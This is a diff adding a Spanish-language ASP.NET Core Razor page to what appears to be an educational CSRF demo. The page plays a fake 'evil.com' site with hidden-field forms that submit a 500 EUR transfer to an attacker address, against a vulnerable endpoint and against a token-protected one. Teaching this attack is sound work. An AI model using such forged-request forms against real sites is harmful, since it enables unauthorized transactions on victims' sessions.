@@ -1,0 +1,42 @@
+@page "/attacker"
+@model AttackerModel
+@{
+    ViewData["Title"] = "evil.com";
+}
+
+<main class="container">
+    <a class="back" href="/">← Volver al inicio</a>
+
+    <h1>evil.com</h1>
+    <p class="banner banner-danger">
+        Simula un sitio malicioso. Si tienes sesion abierta en el banco, estos formularios
+        intentan transferir <strong>500 EUR</strong> a <code>atacante@evil.com</code> sin que
+        lo sepas.
+    </p>
+
+    <section class="hint">
+        <h3>Atacar versión vulnerable</h3>
+        <p>POST a <code>/vulnerable?handler=Transfer</code> sin token Anti-Forgery.</p>
+        <form method="post" action="/vulnerable?handler=Transfer" class="form-inline">
+            <input type="hidden" name="to" value="atacante@evil.com">
+            <input type="hidden" name="amount" value="500">
+            <button type="submit" class="btn-danger">Ejecutar ataque CSRF (vulnerable)</button>
+        </form>
+    </section>
+
+    <section class="hint">
+        <h3>Atacar versión segura</h3>
+        <p>POST sin token → ASP.NET Core devuelve <strong>400 Bad Request</strong>.</p>
+        <form method="post" action="/secure?handler=Transfer" class="form-inline">
+            <input type="hidden" name="to" value="atacante@evil.com">
+            <input type="hidden" name="amount" value="500">
+            <button type="submit" class="btn-danger">Ejecutar ataque CSRF (seguro)</button>
+        </form>
+    </section>
+
+    <p class="note">
+        En un ataque real, <code>evil.com</code> enviaria el formulario automaticamente mientras
+        visitas otra pagina. Para APIs REST con JWT en <code>Authorization</code>, CSRF no aplica
+        porque el atacante no puede hacer que el navegador incluya esa cabecera.
+    </p>
+</main>
